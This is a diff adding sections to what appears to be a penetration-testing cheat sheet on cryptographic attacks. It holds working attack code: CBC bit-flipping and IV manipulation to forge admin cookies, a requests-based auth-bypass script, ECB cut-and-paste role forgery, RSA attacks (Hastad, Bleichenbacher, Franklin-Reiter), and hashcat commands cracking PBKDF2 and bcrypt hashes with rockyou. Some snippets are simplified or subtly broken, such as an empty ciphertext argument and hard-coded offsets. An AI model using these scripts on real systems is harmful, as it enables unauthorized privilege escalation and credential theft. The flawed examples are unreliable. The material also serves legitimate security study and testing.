@@ -593,3 +593,428 @@ curl -sI https://target.com | grep -iE "strict-transport|content-security|x-fram
 # use testssl.sh check HTTP security head
 testssl.sh --headers target.com
 ```
+
+---
+
+## 9. CBC Bit Flipping Attack
+
+### Controlled Byte Manipulation
+
+```python
+"""
+CBC Bit Flipping: Modify ciphertext byte to control decrypted plaintext.
+Flipping bit at position i in block N changes the same position in decrypted block N+1.
+Formula: target_byte = original_cipher_byte XOR original_plain_byte XOR desired_byte
+"""
+def cbc_bit_flip(ciphertext, block_size, byte_offset, original_byte, target_byte):
+    """
+    Flip a byte in the previous ciphertext block to alter decrypted plaintext.
+    byte_offset: position within the target block (0-indexed)
+    """
+    ct = bytearray(ciphertext)
+    # Modify the byte in the PREVIOUS block
+    target_block_start = (byte_offset // block_size) * block_size
+    prev_block_offset = target_block_start - block_size + (byte_offset % block_size)
+    ct[prev_block_offset] ^= original_byte ^ target_byte
+    return bytes(ct)
+
+# Example: Change "role=user" to "role=admin" in encrypted cookie
+# If plaintext block contains "user" at known offset
+ciphertext = bytes.fromhex("aabbccdd...")  # intercepted ciphertext
+modified = cbc_bit_flip(ciphertext, 16, 21, ord('u'), ord('a'))
+```
+
+### Authentication Bypass via CBC Flip
+
+```python
+"""
+Practical CBC bit-flip attack against authentication tokens.
+Target: encrypted cookie like "admin=0;username=guest"
+Goal: flip "admin=0" to "admin=1"
+"""
+import requests
+
+def exploit_cbc_auth_bypass(url, cookie_name, encrypted_cookie, block_size=16):
+    """Flip the '0' in admin=0 to '1' to gain admin access."""
+    ct = bytearray(bytes.fromhex(encrypted_cookie))
+
+    # Position of '0' in "admin=0" within the plaintext
+    # Assuming we know the offset (e.g., byte 6 in block 2)
+    target_pos_in_prev_block = 6  # adjust based on analysis
+    ct[target_pos_in_prev_block] ^= ord('0') ^ ord('1')
+
+    modified_cookie = ct.hex()
+    resp = requests.get(url, cookies={cookie_name: modified_cookie})
+    return resp.text
+
+# Detect CBC bit-flip vulnerability
+def detect_cbc_bitflip(url, cookie_name, encrypted_cookie):
+    """Flip random bytes and observe server behavior differences."""
+    ct = bytearray(bytes.fromhex(encrypted_cookie))
+    ct[0] ^= 0x01  # flip one bit in first byte
+    resp = requests.get(url, cookies={cookie_name: ct.hex()})
+    # If server returns padding error vs auth error -> vulnerable
+    return resp.status_code, resp.text[:200]
+```
+
+### CBC IV Manipulation
+
+```python
+"""
+When IV is user-controlled or prepended to ciphertext,
+manipulating IV directly controls first plaintext block decryption.
+"""
+def cbc_iv_attack(iv, ciphertext, known_plaintext_block1, desired_plaintext):
+    """
+    Modify IV to change first decrypted block.
+    iv: original IV (bytes)
+    known_plaintext_block1: known first block plaintext
+    desired_plaintext: what we want first block to decrypt to
+    """
+    new_iv = bytearray(len(iv))
+    for i in range(len(iv)):
+        new_iv[i] = iv[i] ^ known_plaintext_block1[i] ^ desired_plaintext[i]
+    return bytes(new_iv)
+
+# Example: token = IV || ciphertext, first block decrypts to "guest;admin=false"
+# Goal: make it decrypt to "guest;admin=true\x01"
+iv = bytes.fromhex("00112233445566778899aabbccddeeff")
+known = b"guest;admin=fals"
+target = b"guest;admin=true"
+new_iv = cbc_iv_attack(iv, b"", known, target)
+```
+
+---
+
+## 10. ECB Block Manipulation
+
+### Cut-and-Paste Attack
+
+```python
+"""
+ECB Cut-and-Paste: Since ECB encrypts blocks independently,
+we can rearrange ciphertext blocks to forge valid encrypted data.
+Classic example: forge admin role in structured data.
+"""
+BLOCK_SIZE = 16
+
+def ecb_cut_and_paste_attack(encrypt_fn):
+    """
+    Forge admin profile using ECB block rearrangement.
+    Assumes server encrypts: "email=X&uid=10&role=user"
+    Goal: produce ciphertext that decrypts to role=admin
+    """
+    # Step 1: Craft email so "admin" + padding lands in its own block
+    # "email=" = 6 bytes, need 10 more to fill block 1
+    # Then "admin" + PKCS7 padding (11 bytes of \x0b) fills block 2
+    admin_block_email = "A" * 10 + "admin" + "\x0b" * 11
+    ct1 = encrypt_fn(admin_block_email)
+    admin_block = ct1[16:32]  # extract the "admin\x0b..." block
+
+    # Step 2: Craft email so "role=" ends exactly at block boundary
+    # "email=X&uid=10&role=" = need email length that aligns
+    # "email=" (6) + email + "&uid=10&role=" (13) = multiple of 16
+    # 6 + email_len + 13 = 32 -> email_len = 13
+    normal_email = "A" * 13
+    ct2 = encrypt_fn(normal_email)
+
+    # Step 3: Replace last block with admin block
+    forged = ct2[:32] + admin_block
+    return forged
+```
+
+### ECB Block Reordering for Privilege Escalation
+
+```python
+"""
+ECB block reordering attack against session tokens.
+If token = ECB(user_data), blocks can be swapped to alter meaning.
+"""
+def ecb_block_reorder(ciphertext, block_size=16):
+    """
+    Reorder ECB blocks to change decrypted structure.
+    Example: swap block containing 'role=user' with crafted 'role=admin' block.
+    """
+    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
+
+    # Swap blocks (example: move block 3 to position 1)
+    # This changes the decrypted field ordering
+    reordered = blocks[0] + blocks[2] + blocks[1] + b"".join(blocks[3:])
+    return reordered
+
+def ecb_duplicate_block(ciphertext, source_idx, target_idx, block_size=16):
+    """Duplicate a known block to overwrite another position."""
+    blocks = [bytearray(ciphertext[i:i+block_size]) for i in range(0, len(ciphertext), block_size)]
+    blocks[target_idx] = blocks[source_idx]
+    return b"".join(bytes(b) for b in blocks)
+```
+
+### ECB Chosen-Plaintext Dictionary Attack
+
+```bash
+# Detect ECB mode by submitting repeated blocks
+# If input "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" (32+ identical bytes)
+# produces repeated ciphertext blocks -> ECB confirmed
+
+# Automated ECB detection
+python3 -c "
+import requests
+payload = 'A' * 48  # 3 identical blocks
+resp = requests.post('http://target/encrypt', data={'input': payload})
+ct = bytes.fromhex(resp.text)
+blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
+if len(blocks) != len(set(blocks)):
+    print('ECB MODE DETECTED: repeated ciphertext blocks found')
+else:
+    print('Not ECB (or block size differs)')
+"
+```
+
+---
+
+## 11. RSA Attacks
+
+### Small Exponent Attack (e=3, Hastad's Broadcast)
+
+```python
+"""
+Hastad's Broadcast Attack: When same message is encrypted with e=3
+to 3 different recipients (same e, different n), recover plaintext via CRT.
+"""
+from sympy.ntheory.modular import crt
+from gmpy2 import iroot
+from Crypto.Util.number import long_to_bytes
+
+def hastad_broadcast(ciphertexts, moduli, e=3):
+    """
+    ciphertexts: list of c values [c1, c2, c3]
+    moduli: list of n values [n1, n2, n3]
+    e: public exponent (typically 3)
+    """
+    # Use Chinese Remainder Theorem to find m^e mod (n1*n2*n3)
+    combined_modulus = moduli[0] * moduli[1] * moduli[2]
+    remainders = ciphertexts
+    result = crt(moduli, remainders)
+    m_cubed = result[1] if isinstance(result, tuple) else result
+
+    # Take e-th root
+    m, exact = iroot(int(m_cubed), e)
+    if exact:
+        return long_to_bytes(int(m))
+    return None
+
+# Example usage
+c1, c2, c3 = 123456, 789012, 345678  # ciphertexts
+n1, n2, n3 = 1000003, 1000033, 1000037  # moduli
+plaintext = hastad_broadcast([c1, c2, c3], [n1, n2, n3])
+```
+
+### Bleichenbacher RSA PKCS#1 v1.5 Attack
+
+```python
+"""
+Bleichenbacher's attack against RSA PKCS#1 v1.5 padding.
+Requires a padding oracle (server distinguishes valid/invalid PKCS padding).
+Adaptive chosen-ciphertext attack to decrypt RSA ciphertext.
+"""
+from Crypto.Util.number import bytes_to_long, long_to_bytes
+
+def bleichenbacher_oracle_check(ciphertext_int, n, e, oracle_fn):
+    """
+    oracle_fn: returns True if decrypted ciphertext has valid PKCS#1 v1.5 padding
+    (starts with 0x00 0x02)
+    """
+    return oracle_fn(ciphertext_int)
+
+def bleichenbacher_step2a(c, n, e, B, oracle_fn):
+    """Find smallest s1 >= n/(3B) such that c * s1^e mod n has valid padding."""
+    s = (n + 3 * B - 1) // (3 * B)
+    while True:
+        candidate = (c * pow(s, e, n)) % n
+        if oracle_fn(candidate):
+            return s
+        s += 1
+
+# Detection: send modified ciphertext and observe different error responses
+# If server returns "decryption error" vs "padding error" -> vulnerable
+```
+
+### Coppersmith Short Pad Attack
+
+```python
+"""
+Coppersmith's short pad attack: When RSA message has small unknown padding,
+use lattice reduction to recover plaintext.
+Requires: same message sent twice with different short random padding.
+"""
+from sage.all import *
+
+def coppersmith_short_pad(c1, c2, e, n, pad_bits=64):
+    """
+    c1 = (m + r1)^e mod n
+    c2 = (m + r2)^e mod n
+    Recover m when r1, r2 are small (< 2^pad_bits)
+    """
+    PRx = PolynomialRing(Zmod(n), 'x')
+    x = PRx.gen()
+
+    # Franklin-Reiter related message attack
+    # If m2 = m1 + diff (known relationship)
+    # Then gcd(x^e - c1, (x+diff)^e - c2) reveals m1
+    # For unknown diff, use resultant/lattice methods
+
+    # Simplified: if e=3 and padding is short
+    g1 = x**e - c1
+    g2 = (x + 1)**e - c2  # assuming diff=1 for demonstration
+
+    # Compute GCD in polynomial ring
+    result = g1.gcd(g2)
+    if result.degree() == 1:
+        m = -result.monic().constant_coefficient()
+        return int(m)
+    return None
+```
+
+### RSA Key Recovery from Partial Information
+
+```bash
+# Extract RSA public key from certificate
+openssl x509 -in cert.pem -noout -pubkey > pubkey.pem
+
+# Extract modulus and exponent from public key
+openssl rsa -pubin -in pubkey.pem -text -noout
+
+# Factor weak RSA key using RsaCtfTool
+python3 RsaCtfTool.py --publickey pubkey.pem --private
+
+# Check if modulus is in factordb
+python3 -c "
+from Crypto.PublicKey import RSA
+key = RSA.import_key(open('pubkey.pem').read())
+print(f'n = {key.n}')
+print(f'e = {key.e}')
+print(f'Key size: {key.size_in_bits()} bits')
+# Submit n to http://factordb.com/
+"
+
+# Fermat factorization (when p and q are close)
+python3 RsaCtfTool.py -n <MODULUS> -e 65537 --attack fermat
+```
+
+---
+
+## 12. Key Derivation Weaknesses
+
+### Weak KDF Parameters Detection
+
+```python
+"""
+Detect weak key derivation function parameters.
+Common issues: low iteration count, missing salt, weak algorithm.
+"""
+import hashlib
+import time
+
+def audit_kdf_strength(password, salt, iterations, algorithm='sha256'):
+    """Measure KDF computation time - if too fast, parameters are weak."""
+    start = time.time()
+    hashlib.pbkdf2_hmac(algorithm, password.encode(), salt, iterations)
+    elapsed = time.time() - start
+
+    findings = []
+    if iterations < 100000:
+        findings.append(f"WEAK: iterations={iterations} (recommend >= 600000 for PBKDF2-SHA256)")
+    if len(salt) < 16:
+        findings.append(f"WEAK: salt length={len(salt)} bytes (recommend >= 16)")
+    if elapsed < 0.1:
+        findings.append(f"WEAK: KDF completes in {elapsed:.4f}s (should take >= 0.1s)")
+    if algorithm in ('md5', 'sha1'):
+        findings.append(f"WEAK: using {algorithm} (recommend SHA-256 or SHA-512)")
+    return findings
+
+# Test common weak configurations
+print(audit_kdf_strength("password", b"salt", 1000))  # Too few iterations
+print(audit_kdf_strength("password", b"ab", 100000))  # Salt too short
+```
+
+### Salt Reuse and Predictable Salt Detection
+
+```python
+"""
+Detect salt reuse across multiple password hashes.
+Salt reuse allows precomputation attacks against multiple users.
+"""
+import re
+from collections import Counter
+
+def detect_salt_reuse(hash_file):
+    """Analyze password hash file for salt reuse patterns."""
+    salts = []
+    with open(hash_file) as f:
+        for line in f:
+            # bcrypt format: $2a$rounds$salt_22_chars_hash
+            match = re.match(r'\$2[aby]\$(\d+)\$(.{22})', line.strip())
+            if match:
+                salts.append(match.group(2))
+                continue
+            # PBKDF2 format: algorithm$iterations$salt$hash
+            match = re.match(r'pbkdf2_sha256\$(\d+)\$([^$]+)\$', line.strip())
+            if match:
+                salts.append(match.group(2))
+
+    salt_counts = Counter(salts)
+    reused = {s: c for s, c in salt_counts.items() if c > 1}
+    if reused:
+        print(f"CRITICAL: Salt reuse detected! {len(reused)} salts used multiple times")
+        for salt, count in reused.items():
+            print(f"  Salt '{salt[:8]}...' used {count} times")
+    return reused
+```
+
+### Insufficient Iteration Count Exploitation
+
+```bash
+# Benchmark PBKDF2 cracking speed at various iteration counts
+hashcat -m 10900 -a 0 --benchmark  # PBKDF2-HMAC-SHA256
+
+# Crack PBKDF2 with low iterations (1000 iterations = fast cracking)
+hashcat -m 10900 -a 0 pbkdf2_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Crack bcrypt with low cost factor ($2a$04$ = only 16 rounds)
+hashcat -m 3200 -a 0 bcrypt_low_cost.txt /usr/share/wordlists/rockyou.txt
+
+# Compare: bcrypt cost=4 vs cost=12 cracking speed
+# cost=4: ~1M hashes/sec on GPU
+# cost=12: ~15 hashes/sec on GPU
+echo "Low cost bcrypt is 65000x faster to crack"
+```
+
+### Weak KDF Algorithm Identification
+
+```bash
+# Identify KDF algorithm from hash format
+python3 -c "
+import sys
+hash_samples = [
+    '\$2a\$04\$',      # bcrypt cost=4 (WEAK: minimum recommended is 10)
+    '\$2a\$12\$',      # bcrypt cost=12 (OK)
+    'pbkdf2:sha1:1000', # PBKDF2-SHA1 1000 iterations (WEAK)
+    'pbkdf2_sha256\$10000\$',  # PBKDF2-SHA256 10000 iter (WEAK: recommend 600000)
+    'scrypt:N=1024:',   # scrypt N=1024 (WEAK: recommend N=32768+)
+    'argon2id\$v=19\$m=16384,t=2,p=1',  # Argon2id (check params)
+]
+for h in hash_samples:
+    print(f'Pattern: {h}')
+"
+
+# Extract and audit Django password hashes
+python3 -c "
+# Django default: pbkdf2_sha256\$iterations\$salt\$hash
+import re
+with open('auth_user.csv') as f:
+    for line in f:
+        match = re.search(r'pbkdf2_sha256\\\$(\d+)\\\$', line)
+        if match and int(match.group(1)) < 260000:
+            print(f'WEAK iterations: {match.group(1)}')
+"
+```
